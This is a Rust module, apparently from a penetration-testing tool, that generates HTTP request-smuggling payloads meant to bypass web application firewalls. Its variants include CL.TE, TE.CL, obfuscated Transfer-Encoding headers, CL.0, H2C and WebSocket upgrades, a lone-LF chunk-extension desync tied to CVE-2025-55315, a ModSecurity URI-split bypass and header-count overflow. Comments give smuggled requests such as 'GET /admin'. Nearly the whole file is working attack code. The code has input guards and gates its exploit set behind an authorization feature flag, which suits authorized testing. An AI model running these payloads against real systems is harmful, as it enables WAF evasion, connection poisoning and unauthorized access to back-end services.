//! HTTP request smuggling payloads for WAF bypass.

use crate::safety::{Canary, guard_prefix_len, sanitize_input};

/// A smuggling payload ready to inject into a raw TCP connection.
#[derive(Debug, Clone)]
pub struct SmugglingPayload {
    pub description: String,
    pub variant: SmugglingVariant,
    pub raw_bytes: Vec<u8>,
    pub canary: Canary,
}

/// Which request-smuggling variant this payload targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SmugglingVariant {
    ClTe,
    TeCl,
    TeTe,
    H2c,
    WebSocket,
    ClZero,
    DualCl,
    MultiValueCl,
    ClObfuscation,
    ChunkExtension,
    /// CVE-2025-55315 — chunk-extension with a lone LF embedded inside
    /// the extension field. Proxies that treat bare `\n` as a line
    /// terminator (Akamai, F5, some IIS configurations) split the
    /// stream at the LF; Kestrel and .NET-class back-ends search only
    /// for `\r` when parsing extensions, so the same bytes look like
    /// extension continuation. The bytes between the LF and the
    /// `0\r\n\r\n` chunk terminator become a smuggled request that
    /// reaches the origin invisible to the WAF (which doesn't inspect
    /// chunk extensions). CVSS 9.9; Praetorian disclosure Oct 2025.
    /// R69 pass-21 — frontier technique per the 2025 research scan.
    ChunkExtensionLoneLf,
    Http10,
    Http09,
    Pipeline,
    DetectClTe,
    DetectTeCl,
    MethodBody,
    /// Kettle BH25: 0.CL desync — front-end ignores CL, back-end honors it.
    KettleDesync,
    /// Kettle BH25: Browser-powered H2→H1 downgrade with conflicting CL.
    Browser0CL,
}

pub const DEFAULT_HTTP2_SETTINGS: &str = "AAMAAABkAARAAAAAAAIAAAAA";

fn ensure_crlf(s: &str) -> String {
    if s.ends_with("\r\n") {
        s.into()
    } else {
        format!("{s}\r\n")
    }
}

fn ensure_double_crlf(s: &str) -> String {
    if s.ends_with("\r\n\r\n") {
        s.into()
    } else if s.ends_with("\r\n") {
        format!("{s}\r\n")
    } else {
        format!("{s}\r\n\r\n")
    }
}

fn validate_host(host: &str) -> Result<String, crate::safety::SafetyError> {
    sanitize_input(host)
}

fn validate_prefix(prefix: &str) -> Result<String, crate::safety::SafetyError> {
    guard_prefix_len(prefix, 64 * 1024)?;
    Ok(prefix.into())
}

/// Generate all TE obfuscation mutations (Smuggler matrix + Unicode + nulls + quotes + case).
pub fn te_obfuscations() -> Vec<String> {
    let base = vec![
        "Transfer-Encoding: chunked",
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding\t: chunked",
        " Transfer-Encoding: chunked",
        "\tTransfer-Encoding: chunked",
        "Transfer-Encoding: chunked ",
        "Transfer-Encoding: chunked\t",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        "Transfer-Encoding:\n chunked",
        "Transfer-Encoding:\r\n chunked",
        // CVE-2024-1135 (Gunicorn) class — single header, multiple
        // comma-separated encodings. WAFs normalising to the FIRST
        // value see `identity` (whitelisted RFC 2616, skip), backend
        // parses left-to-right, finds identity valid, processes body
        // as the NEXT value (`chunked`). Different body length than
        // WAF inspected. See: https://www.cve.news/cve-2024-1135/
        "Transfer-Encoding: identity, chunked",
        "Transfer-Encoding: identity,chunked",
        "Transfer-Encoding: identity ,chunked",
        "Transfer-Encoding: chunked, identity",
        "Transfer-Encoding: chunked , identity",
        // Three-element variant — some parsers stop after the first
        // valid value, others scan to the last; both interpretations
        // disagree with at least one WAF normaliser.
        "Transfer-Encoding: identity, chunked, identity",
        // Casing variant on identity itself — same logic, smaller
        // overlap with case-folded WAF rules.
        "Transfer-Encoding: Identity, chunked",
    ];
    let unicode_ws: Vec<String> = [
        '\u{00a0}', '\u{0085}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2002}', '\u{2003}',
        '\u{2004}', '\u{2005}', '\u{2006}', '\u{2007}', '\u{2008}', '\u{2009}', '\u{200a}',
        '\u{2028}', '\u{2029}', '\u{212a}',
    ]
    .iter()
    .map(|c| format!("Transfer-Encoding:{c}chunked"))
    .collect();
    let nulls: Vec<String> = vec![
        "Transfer-Encoding: \x00chunked".into(),
        "\x00Transfer-Encoding: chunked".into(),
    ];
    let quotes: Vec<String> = vec![
        "Transfer-Encoding: \"chunked\"".into(),
        "Transfer-Encoding: 'chunked'".into(),
        "Transfer-Encoding: `chunked`".into(),
    ];
    let case_vars: Vec<String> = vec![
        "transfer-encoding: chunked".into(),
        "Transfer-encoding: Chunked".into(),
        "TRANSFER-ENCODING: CHUNKED".into(),
    ];
    let prefixes: Vec<String> = vec![
        "X-Transfer-Encoding: chunked".into(),
        "Transfer-Encodingx: chunked".into(),
    ];
    let line_terms: Vec<String> = vec![
        "Transfer-Encoding: chunked\r".into(),
        "Transfer-Encoding: chunked\n".into(),
    ];
    let mut out: Vec<String> = base.into_iter().map(String::from).collect();
    out.extend(unicode_ws);
    out.extend(nulls);
    out.extend(quotes);
    out.extend(case_vars);
    out.extend(prefixes);
    out.extend(line_terms);
    out
}

/// Build a canonical Portswigger CL.TE smuggle.
///
/// Sets Content-Length to the FULL body length so the CL-following
/// front-end reads (and forwards) every body byte — including the
/// smuggled prefix — while the TE-following backend reads `0\r\n`,
/// stops at the chunked-end marker, and leaves the post-chunk bytes
/// in its connection buffer to be parsed as the next request.
///
/// Pre-fix this hardcoded CL=0 ("Backward-compatible CL.TE
/// (hardcodes CL=0)") which produced a CL-front-end that
/// forwarded ZERO body bytes — the smuggled prefix never reached
/// the TE-backend's buffer and the desync never fired. Caller
/// scripts that wanted a non-canonical CL value have always had
/// `cl_te_custom` available.
pub fn cl_te(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    // Compute the body length the same way cl_te_custom serializes
    // it so the CL on the wire matches the bytes that follow.
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body_len = "0\r\n\r\n".len() + prefix.len();
    cl_te_custom(host, smuggled_prefix, body_len)
}

/// CL.TE with a custom Content-Length.
pub fn cl_te_custom(
    host: &str,
    smuggled_prefix: &str,
    content_length: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {content_length}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: format!("CL.TE CL={content_length}"),
        variant: SmugglingVariant::ClTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Backward-compatible TE.CL (dynamically computes CL).
pub fn te_cl(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let smuggled = ensure_crlf(&prefix);
    let smuggled_bytes = smuggled.as_bytes();
    // Chunked framing per RFC: chunk-size CRLF, chunk-data (exactly N octets), CRLF, …, 0 CRLF CRLF.
    let chunk_size_line = format!("{:x}\r\n", smuggled_bytes.len());
    // CL covers just the first chunk-size line (e.g., "5\r\n" => 3 bytes for single-digit)
    let content_length = chunk_size_line.len();
    let mut raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {content_length}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n"
    )
    .into_bytes();
    raw.extend_from_slice(chunk_size_line.as_bytes());
    raw.extend_from_slice(smuggled_bytes);
    raw.extend_from_slice(b"\r\n");
    raw.extend_from_slice(b"0\r\n\r\n");
    Ok(SmugglingPayload {
        description: format!("TE.CL CL={content_length}"),
        variant: SmugglingVariant::TeCl,
        raw_bytes: raw,
        canary: Canary::generate(),
    })
}

/// TE.TE with full obfuscation matrix.
pub fn te_te(
    host: &str,
    smuggled_prefix: &str,
    obfuscation_index: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let obs = te_obfuscations();
    let te_header = &obs[obfuscation_index % obs.len()];
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 0\r\n\
         {te_header}\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: format!("TE.TE obfuscation {}", obfuscation_index % obs.len()),
        variant: SmugglingVariant::TeTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// CL.0 payload.
pub fn cl_zero(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 0\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: "CL.0".into(),
        variant: SmugglingVariant::ClZero,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Dual-Content-Length payload.
pub fn dual_cl(
    host: &str,
    smuggled_prefix: &str,
    cl1: usize,
    cl2: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {cl1}\r\n\
         Content-Length: {cl2}\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: format!("Dual-CL {cl1}/{cl2}"),
        variant: SmugglingVariant::DualCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Multi-value Content-Length.
pub fn multi_value_cl(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 5, 6\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: "Multi-value CL".into(),
        variant: SmugglingVariant::MultiValueCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Content-Length formatting mutations.
pub fn cl_obfuscation(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let values = vec!["+5", "05", "5 ", "\t5"];
    Ok(values
        .into_iter()
        .map(|v| {
            let raw = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Content-Length: {v}\r\n\
                 \r\n\
                 {prefix}"
            );
            SmugglingPayload {
                description: format!("CL-obfuscation '{v}'"),
                variant: SmugglingVariant::ClObfuscation,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// Chunk-extension payload.
pub fn chunk_extension(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("1;ext=foo\r\nX\r\n0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: "Chunk-extension".into(),
        variant: SmugglingVariant::ChunkExtension,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// CVE-2025-55315 — chunk-extension TERM.EXT desync via lone LF.
///
/// The smuggled request rides inside what looks (to one parser) like
/// the chunk-extension token, separated from the chunk-size with a
/// bare `\n` instead of the spec-required `\r\n`. Front-end proxies
/// that accept bare LF as a line terminator (Akamai's edge layer is
/// confirmed; F5 BIG-IP and several IIS configs reproduce it) split
/// the stream at the LF and forward everything before as one request
/// and everything after as the next. Kestrel and other .NET-class
/// back-ends scan for `\r` ONLY when parsing chunk extensions, so the
/// same bytes look like a single chunk-extension parameter. WAFs
/// rarely inspect chunk-extension values — the smuggled bytes are
/// invisible to them.
///
/// Wire shape (lone-LF marked `\n` explicitly):
///
/// ```text
/// POST / HTTP/1.1
/// Host: target
/// Transfer-Encoding: chunked
///
/// 5;ext=val\n
/// GET /admin HTTP/1.1
/// Host: target
///
/// 0
///
/// ```
///
/// `smuggled_prefix` becomes the inner request line + headers. The
/// `5` is the size of the first dummy chunk's payload (5 bytes of
/// `XXXXX`) which keeps the framing valid even for the parser that
/// processed the extension correctly.
///
/// Pass 21 R69 — CVE-2025-55315 frontier technique.
pub fn chunk_extension_lone_lf(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    // The smuggled request must terminate cleanly so the back-end
    // sees a well-formed pipelined request after the desync.
    let prefix = ensure_double_crlf(&prefix);
    // The body is one 5-byte dummy chunk whose extension field
    // contains a lone LF followed by the smuggled request. After
    // the dummy chunk's data, the closing `0\r\n\r\n` terminates
    // the outer chunked encoding.
    //
    // Wire bytes (using `\n` for lone-LF and `\r\n` for CRLF):
    //   `5;evilext=\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\nXXXXX\r\n0\r\n\r\n`
    //
    // Front-end (LF-tolerant): sees `5;evilext=` as the size+extension,
    // then `\n` as a line terminator, then `GET /admin...` as a NEW
    // request. The LF-tolerant parser pipelines that as a second
    // request. The `XXXXX\r\n0\r\n\r\n` is leftover bytes the LF
    // parser drops or appends to the second request.
    //
    // Back-end (CR-only, Kestrel-class): scans for `\r` in the
    // extension. Sees `5;evilext=\nGET /admin HTTP/1.1...Host: target\r`
    // (the trailing `\r` from the smuggled request's CRLF) as the
    // ENTIRE extension value, then reads exactly 5 bytes (`XXXXX`)
    // as the chunk data, then `0\r\n\r\n` as terminator. One request,
    // smuggled-request bytes hidden inside extension noise.
    let body = format!("5;evilext=\n{prefix}XXXXX\r\n0\r\n\r\n");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: "Chunk-extension with lone-LF desync (CVE-2025-55315)".into(),
        variant: SmugglingVariant::ChunkExtensionLoneLf,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Chunk-size formatting mutations.
pub fn chunk_size_mutations(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let sizes = vec!["00000001", "1A", "1;", "1\t"];
    Ok(sizes
        .into_iter()
        .map(|sz| {
            let body = format!("{sz}\r\nX\r\n0\r\n\r\n{prefix}");
            let raw = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 {body}"
            );
            SmugglingPayload {
                description: format!("Chunk-size '{sz}'"),
                variant: SmugglingVariant::ChunkExtension,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// GET/PUT/DELETE/... body smuggling.
pub fn method_body_smuggle(
    method: &str,
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "{method} / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {}\r\n\
         \r\n\
         {prefix}",
        prefix.len()
    );
    Ok(SmugglingPayload {
        description: format!("Method-body {method}"),
        variant: SmugglingVariant::MethodBody,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// HTTP/1.0 persistence disagreement.
pub fn http10_persistence(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    Ok(vec![
        format!(
            "POST / HTTP/1.0\r\n\
             Host: {host}\r\n\
             Connection: keep-alive\r\n\
             Content-Length: {}\r\n\
             \r\n\
             {prefix}",
            prefix.len()
        ),
        format!(
            "POST / HTTP/1.0\r\n\
             Host: {host}\r\n\
             Proxy-Connection: keep-alive\r\n\
             Content-Length: {}\r\n\
             \r\n\
             {prefix}",
            prefix.len()
        ),
    ]
    .into_iter()
    .map(|raw| SmugglingPayload {
        description: "HTTP/1.0 persistence".into(),
        variant: SmugglingVariant::Http10,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
    .collect())
}

/// HTTP/0.9 simple-request smuggling.
pub fn http09_downgrade(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let _host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let raw = format!("GET /\r\n{}", ensure_double_crlf(&prefix));
    Ok(SmugglingPayload {
        description: "HTTP/0.9 simple-request".into(),
        variant: SmugglingVariant::Http09,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Pipeline builder: returns (poison, victim) byte sequences.
pub fn pipeline_builder(
    poison: &SmugglingPayload,
    victim_method: &str,
    victim_path: &str,
    host: &str,
) -> Result<(Vec<u8>, Vec<u8>), crate::safety::SafetyError> {
    let _host = sanitize_input(host)?;
    let _victim_method = sanitize_input(victim_method)?;
    let _victim_path = sanitize_input(victim_path)?;
    let victim = format!("{victim_method} {victim_path} HTTP/1.1\r\nHost: {host}\r\n\r\n");
    Ok((poison.raw_bytes.clone(), victim.into_bytes()))
}

/// Safe detection probe for CL.TE (causes back-end hang without socket poisoning).
///
/// Body shape is the canonical Portswigger CL.TE timing oracle:
///
/// ```text
/// 0\r\n
/// \r\n
/// X
/// ```
///
/// That's exactly 6 bytes (`0`, `\r`, `\n`, `\r`, `\n`, `X`).
/// Pre-fix this used `0\r\nX\r\n\r\n` — 8 bytes with data AFTER the
/// final chunk terminator. RFC 7230 §4.1 says trailers may follow
/// `0\r\n` but only as `name: value\r\n*` then `\r\n` — a bare
/// byte like `X` makes the body invalid chunked encoding. Strict
/// parsers (Apache, recent nginx, Envoy) return 400 instead of
/// hanging, defeating the timing oracle. The canonical form keeps
/// the body valid for both interpretations:
///
/// - CL-following frontend (CL=6) reads all 6 bytes and forwards.
/// - TE-following backend reads `0\r\n` (chunk-size 0 = end),
///   then `\r\n` (trailer-section terminator), leaving the `X`
///   in the connection buffer to prepend the next request.
///
/// Result: the backend hangs waiting for the next request (or
/// pipelines a corrupted one); the frontend is satisfied; CL ≠
/// TE confirmed via the latency delta.
pub fn detect_cl_te(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         X"
    );
    Ok(SmugglingPayload {
        description: "Detect CL.TE (timing)".into(),
        variant: SmugglingVariant::DetectClTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Safe detection probe for TE.CL.
pub fn detect_te_cl(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    // Valid chunked prefix but CL shorter than chunk data → back-end hangs.
    //
    // Byte accounting for the body section:
    //   "5\r\n" = 3 bytes  (chunk-size line: '5', CR, LF)
    //   "\r\n"  = 2 bytes  (that is the chunk-data — 5 is the chunk-size but
    //                        the body here uses "\r\n" as placeholder data,
    //                        followed by the terminating chunk)
    //   "0\r\n\r\n" = 5 bytes
    //
    // The CL-following front-end reads exactly Content-Length bytes from the
    // body: setting CL=3 makes it read only "5\r\n" and stop, while the
    // TE-following back-end reads the full chunked sequence and hangs waiting
    // for more data that the front-end never forwards.
    //
    // Previous value was CL=4 (off-by-one: counted '5', CR, LF, and a
    // phantom fourth byte that doesn't exist in "5\r\n").
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 3\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         5\r\n\r\n\
         0\r\n\r\n"
    );
    Ok(SmugglingPayload {
        description: "Detect TE.CL (timing)".into(),
        variant: SmugglingVariant::DetectTeCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Precedence test: both CL and TE present with matching body.
pub fn cl_te_precedence_test(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let body = "5\r\nhello\r\n0\r\n\r\n";
    let cl = body.len();
    Ok(vec![SmugglingPayload {
        description: "CL+TE precedence test".into(),
        variant: SmugglingVariant::ClTe,
        raw_bytes: format!(
            "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Content-Length: {cl}\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 {body}"
        )
        .into_bytes(),
        canary: Canary::generate(),
    }])
}

/// H2C upgrade smuggling.
pub fn h2c_smuggle(
    host: &str,
    http2_settings: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
    // Guard the caller-supplied settings value — it is interpolated
    // verbatim into `HTTP2-Settings: {settings}\r\n`. A CRLF-embedded
    // value (e.g. `"AAAA\r\nEvil: hdr"`) would inject a raw header.
    // The default constant is safe; only caller-supplied values need
    // the check (we guard unconditionally for future default changes).
    if http2_settings.is_some() {
        crate::safety::guard_no_crlf(settings)?;
    }
    let raw = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: {settings}\r\n\
         \r\n"
    );
    Ok(SmugglingPayload {
        description: "H2C upgrade".into(),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// H2C `--upgrade-only` variant.
pub fn h2c_upgrade_only_smuggle(
    host: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let raw = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade\r\n\
         Upgrade: h2c\r\n\
         \r\n"
    );
    Ok(SmugglingPayload {
        description: "H2C upgrade-only".into(),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Malformed HTTP2-Settings variants.
pub fn malformed_http2_settings(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = vec!["!!!", "", "AA"];
    Ok(settings
        .into_iter()
        .map(|s| {
            let raw = format!(
                "GET / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Connection: Upgrade, HTTP2-Settings\r\n\
                 Upgrade: h2c\r\n\
                 HTTP2-Settings: {s}\r\n\
                 \r\n"
            );
            SmugglingPayload {
                description: format!("H2C malformed settings '{s}'"),
                variant: SmugglingVariant::H2c,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// H2C POST-body smuggling.
pub fn h2c_post_smuggle(
    host: &str,
    body: &[u8],
    http2_settings: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
    // Same guard as h2c_smuggle — settings is interpolated verbatim
    // into `HTTP2-Settings: {settings}\r\n`.
    if http2_settings.is_some() {
        crate::safety::guard_no_crlf(settings)?;
    }
    let content_length = body.len();
    let mut raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: {settings}\r\n\
         Content-Length: {content_length}\r\n\
         \r\n"
    )
    .into_bytes();
    raw.extend_from_slice(body);
    Ok(SmugglingPayload {
        description: format!("H2C POST body={content_length}"),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw,
        canary: Canary::generate(),
    })
}

/// CVE-2024-1019 — ModSecurity v3.0.0–3.0.11 URI pre-decode path/query split.
///
/// ModSec URL-decodes the entire URI before splitting on `?`. A `%3F`
/// (the URL-encoded `?`) embedded in what the backend considers the
/// PATH becomes a literal `?` to ModSec, so ModSec sees the query
/// starting earlier than the backend does. The injection lives in
/// what ModSec calls the query (and inspects loosely) but the backend
/// calls the path (and routes verbatim, executing the payload).
///
/// Constructs a single-line probe path that places `injection_payload`
/// between an encoded `?` (i.e., backend-path territory) and a real
/// `?` (backend-query boundary). Fixed in ModSec 3.0.12.
#[must_use]
pub fn modsec_uri_pre_decode_split(
    base_path: &str,
    injection_payload: &str,
    benign_query: &str,
) -> String {
    // `base_path` + `%3F` + injection lands in backend PATH; ModSec
    // sees `?injection&benign_query`. nginx / Apache split on the
    // first LITERAL `?`, which is the trailing real one.
    format!("{base_path}%3F{injection_payload}?{benign_query}")
}

/// OpenResty / Cloudflare header-count truncation (Snapsec / HackerOne #3027461).
///
/// OpenResty (CF FL) parses max ~94–100 headers (including its own
/// internal CF-* headers). Headers beyond that threshold are silently
/// discarded by the rule engine but forwarded to origin. Send N
/// benign padding headers (`X-Pad-i: v`) plus one payload header
/// past the truncation cutoff — origin sees the payload, WAF does not.
///
/// `padding_count` is parameterised so MCTS can sweep 90..=110 and
/// find each WAF vendor's exact cutoff.
#[must_use]
pub fn header_overflow_smuggle(
    padding_count: usize,
    payload_header: &str,
    payload_value: &str,
) -> Vec<(String, String)> {
    let mut headers: Vec<(String, String)> = (0..padding_count)
        .map(|i| (format!("X-Pad-{i}"), "v".into()))
        .collect();
    headers.push((payload_header.into(), payload_value.into()));
    headers
}

/// WebSocket smuggling with a random nonce.
pub fn websocket_smuggle(
    host: &str,
    path: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    websocket_smuggle_custom(host, path, None, None)
}

/// WebSocket smuggling with custom key and optional protocols.
pub fn websocket_smuggle_custom(
    host: &str,
    path: &str,
    key: Option<&str>,
    protocols: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let path = sanitize_input(path)?;
    if let Some(k) = key {
        crate::safety::guard_no_crlf(k)?;
    }
    if let Some(p) = protocols {
        crate::safety::guard_no_crlf(p)?;
    }
    let key = key.map_or_else(
        || {
            let mut nonce = [0u8; 16];
            rand::Rng::fill(&mut rand::thread_rng(), &mut nonce);
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce)
        },
        std::string::ToString::to_string,
    );
    let protocol_header = protocols.map_or(String::new(), |p| {
        format!("Sec-WebSocket-Protocol: {p}\r\n")
    });
    let raw = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade\r\n\
         Upgrade: websocket\r\n\
         Sec-WebSocket-Key: {key}\r\n\
         Sec-WebSocket-Version: 13\r\n\
         {protocol_header}\r\n"
    );
    Ok(SmugglingPayload {
        description: "WebSocket upgrade".into(),
        variant: SmugglingVariant::WebSocket,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// All detection probes (safe, never poison sockets).
pub fn all_detection_probes(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    Ok(vec![detect_cl_te(host)?, detect_te_cl(host)?])
}

/// All exploit payloads (requires `unsafe-probes` feature).
///
/// # Safety
/// Sends intentionally malformed or desynchronising HTTP traffic that may
/// corrupt downstream parser state, poison connection pools, or cause
/// request splitting. Only enable on targets you own or have explicit
/// written authorization to test.
#[cfg(feature = "unsafe-probes")]
pub fn all_payloads(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let mut out = vec![
        cl_te(host, smuggled_prefix)?,
        te_cl(host, smuggled_prefix)?,
        cl_zero(host, smuggled_prefix)?,
        h2c_smuggle(host, None)?,
        h2c_upgrade_only_smuggle(host)?,
        websocket_smuggle(host, "/")?,
        chunk_extension(host, smuggled_prefix)?,
        dual_cl(host, smuggled_prefix, 6, 5)?,
        multi_value_cl(host, smuggled_prefix)?,
        method_body_smuggle("GET", host, smuggled_prefix)?,
        http09_downgrade(host, smuggled_prefix)?,
    ];
    for i in 1..te_obfuscations().len().min(6) {
        out.push(te_te(host, smuggled_prefix, i)?);
    }
    out.extend(cl_obfuscation(host, smuggled_prefix)?);
    out.extend(chunk_size_mutations(host, smuggled_prefix)?);
    out.extend(http10_persistence(host, smuggled_prefix)?);
    out.extend(malformed_http2_settings(host)?);
    out.extend(cl_te_precedence_test(host)?);
    out.push(h2c_post_smuggle(host, b"test", None)?);
    out.push(websocket_smuggle_custom(host, "/ws", None, None)?);
    Ok(out)
}

// ═══════════════════════════════════════════════════════════════════════════
// Kettle BH USA 2025 — "HTTP/1.1 Must Die: The Desync Endgame" primitives
// ═══════════════════════════════════════════════════════════════════════════

/// Registry of all Kettle BH25 primitive names for integration testing.
